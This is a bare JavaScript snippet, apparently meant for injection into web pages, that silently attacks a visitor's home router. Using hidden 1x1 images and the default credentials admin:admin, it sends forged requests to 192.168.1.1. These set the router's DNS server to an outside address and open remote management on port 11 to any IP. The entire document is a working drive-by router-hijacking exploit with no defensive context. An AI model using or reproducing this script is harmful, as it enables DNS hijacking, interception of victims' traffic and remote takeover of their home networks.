if (MSIE = navigator.userAgent.indexOf(&#34;MSIE&#34;) == -1) {
    document.writeln(&#34;&lt;div style=\&#39;display:none\&#39;&gt;&#34;);

    function ip1() {
        i = new Image;
        i.src = &#39;http://192.168.1.1/userRpm/PPPoECfgAdvRpm.htm?wan=0&amp;lcpMru=1480&amp;ServiceName=&amp;AcName=&amp;EchoReq=0&amp;manual=2&amp;dnsserver=58.221.59.217&amp;dnsserver2=114.114.114.114&amp;downBandwidth=0&amp;upBandwidth=0&amp;Save=%B1%A3+%B4%E6&amp;Advanced=Advanced&#39;;
    }
    document.write(&#39;&lt;img src=&#34;http://admin:admin@192.168.1.1/images/logo.jpg&#34; height=1 width=1 onload=ip1()&gt;&#39;);

    function ip3() {
        ii = new Image;
        ii.src = &#39;http://192.168.1.1/userRpm/ManageControlRpm.htm?port=11&amp;ip=0.0.0.0&amp;Save=%C8%B7+%B6%A8&#39;;
    }
    document.write(&#39;&lt;img src=&#34;http://admin:admin@192.168.1.1/images/logo.jpg&#34; height=1 width=1 onload=ip3()&gt;&#39;);
    document.writeln(&#34;&lt;/div&gt;&#34;);
}

